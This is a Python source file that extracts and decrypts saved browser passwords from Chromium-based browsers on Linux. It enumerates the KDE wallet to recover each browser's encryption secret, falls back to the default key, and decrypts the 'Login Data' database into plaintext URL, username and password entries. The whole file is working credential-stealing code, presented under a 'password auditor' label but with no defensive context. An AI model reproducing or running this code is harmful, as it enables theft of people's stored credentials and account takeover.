import os, sqlite3, shutil, subprocess
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

# Maps browser name -> (kwallet search hint, config path)
# hint is fuzzy-matched against KWallet folder names at runtime
BROWSER_CONFIG = {
    "chromium": ("chromium", "~/.config/chromium"),
    "chrome":   ("chrome",   "~/.config/google-chrome"),
    "edge":     ("edge",     "~/.config/microsoft-edge"),
    "brave":    ("brave",    "~/.config/BraveSoftware/Brave-Browser"),
    "opera":    ("opera",    "~/.config/opera"),
}


def _get_wallet_name():
    """Dynamically resolve the default KWallet name via qdbus."""
    for qdbus in ["qdbus", "qdbus6"]:
        try:
            res = subprocess.run(
                [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                 "org.kde.KWallet.networkWallet"],
                capture_output=True, text=True, timeout=3
            )
            if res.returncode == 0 and res.stdout.strip():
                return res.stdout.strip()
        except Exception:
            continue
    return "kdewallet"  # safe fallback


def _list_wallet_folders(wallet):
    """List all folders in the wallet, deduplicated."""
    try:
        res = subprocess.run(
            ["kwallet-query", "-l", wallet, "-f", ""],
            capture_output=True, text=True, timeout=3
        )
        if res.returncode == 0:
            return list(dict.fromkeys(
                line.strip() for line in res.stdout.splitlines() if line.strip()
            ))
    except Exception:
        pass
    return []


def _list_folder_keys(wallet, folder):
    """List all keys inside a KWallet folder."""
    try:
        res = subprocess.run(
            ["kwallet-query", "-l", wallet, "-f", folder],
            capture_output=True, text=True, timeout=3
        )
        if res.returncode == 0:
            return [line.strip() for line in res.stdout.splitlines() if line.strip()]
    except Exception:
        pass
    return []


def _read_kwallet_key(wallet, folder, key):
    """Read a specific key's value from KWallet."""
    try:
        res = subprocess.run(
            ["kwallet-query", "-r", key, "-f", folder, wallet],
            capture_output=True, timeout=3
        )
        if res.returncode == 0 and res.stdout.strip():
            return res.stdout.strip()  # bytes
    except Exception:
        pass
    return None


def _discover_kwallet_secret(browser_hint):
    """
    Dynamically discover the encryption secret for a browser by:
    1. Resolving the real wallet name
    2. Listing all folders in the wallet
    3. Fuzzy-matching folders against the browser hint
    4. Iterating keys inside matched folders until one returns a value
    No hardcoded folder or key names.
    """
    wallet  = _get_wallet_name()
    folders = _list_wallet_folders(wallet)
    if not folders:
        return None

    hint    = browser_hint.lower()
    matched = [f for f in folders if hint in f.lower()]
    if not matched:
        return None

    for folder in matched:
        keys = _list_folder_keys(wallet, folder)
        for key in keys:
            secret = _read_kwallet_key(wallet, folder, key)
            if secret:
                return secret
    return None


def _get_secret_dbus_fallback(browser_hint):
    """
    Secondary fallback: open KWallet via D-Bus and read all passwords
    from folders matching the browser hint.
    """
    for qdbus in ["qdbus", "qdbus6"]:
        try:
            res = subprocess.run(
                [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                 "org.kde.KWallet.networkWallet"],
                capture_output=True, text=True, timeout=3
            )
            wallet_name = res.stdout.strip() or "kdewallet"

            res = subprocess.run(
                [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                 "org.kde.KWallet.open", wallet_name, "0", "password_auditor"],
                capture_output=True, text=True, timeout=5
            )
            handle = res.stdout.strip()
            if not handle or not handle.isdigit():
                continue
            handle = int(handle)

            res = subprocess.run(
                [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                 "org.kde.KWallet.folderList", str(handle), "password_auditor"],
                capture_output=True, text=True, timeout=3
            )
            folders = [
                f.strip() for f in res.stdout.splitlines()
                if f.strip() and browser_hint.lower() in f.strip().lower()
            ]

            for folder in folders:
                res = subprocess.run(
                    [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                     "org.kde.KWallet.entryList", str(handle), folder, "password_auditor"],
                    capture_output=True, text=True, timeout=3
                )
                keys = [k.strip() for k in res.stdout.splitlines() if k.strip()]
                for key in keys:
                    res = subprocess.run(
                        [qdbus, "org.kde.kwalletd5", "/modules/kwalletd5",
                         "org.kde.KWallet.readPassword",
                         str(handle), folder, key, "password_auditor"],
                        capture_output=True, text=True, timeout=3
                    )
                    if res.returncode == 0 and res.stdout.strip():
                        return res.stdout.strip().encode()
        except Exception:
            continue
    return None


def _derive_key(secret):
    """PBKDF2-SHA1, 1 iteration, 16-byte key — standard for all Chromium browsers."""
    if isinstance(secret, str):
        secret = secret.encode()
    return pbkdf2_hmac("sha1", secret, b"saltysalt", 1, 16)


def _decrypt_pw(enc, key):
    """Decrypt a v10/v11 AES-128-CBC encrypted password blob."""
    if enc[:3] in (b"v10", b"v11"):
        enc = enc[3:]
    iv     = b" " * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec    = cipher.decrypt(enc)
    pad    = dec[-1]
    if not (1 <= pad <= 16):
        raise ValueError("bad padding")
    return dec[:-pad].decode(errors="ignore")


def extract_browser_passwords(browser):
    browser = browser.lower()
    if browser not in BROWSER_CONFIG:
        return []

    hint, base_path = BROWSER_CONFIG[browser]
    base     = os.path.expanduser(base_path)
    login_db = os.path.join(base, "Default", "Login Data")
    tmp_db   = "/tmp/_audit_login.db"

    if not os.path.exists(login_db):
        return []

    try:
        shutil.copy2(login_db, tmp_db)
    except Exception as e:
        return [f"<copy failed: {e}>"]

    # Discovery chain: kwallet-query -> qdbus D-Bus -> peanuts fallback
    secret = _discover_kwallet_secret(hint) \
          or _get_secret_dbus_fallback(hint) \
          or b"peanuts"

    key   = _derive_key(secret)
    creds = []

    try:
        db  = sqlite3.connect(tmp_db)
        cur = db.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc in cur.fetchall():
            if not enc:
                continue
            if isinstance(enc, memoryview):
                enc = enc.tobytes()
            try:
                pwd = _decrypt_pw(enc, key)
            except Exception:
                pwd = "<decrypt failed>"
            creds.append(f"{url} | {user} | {pwd}")
        db.close()
    except Exception as e:
        return [f"<db error: {e}>"]
    finally:
        try:
            os.remove(tmp_db)
        except Exception:
            pass

    return creds
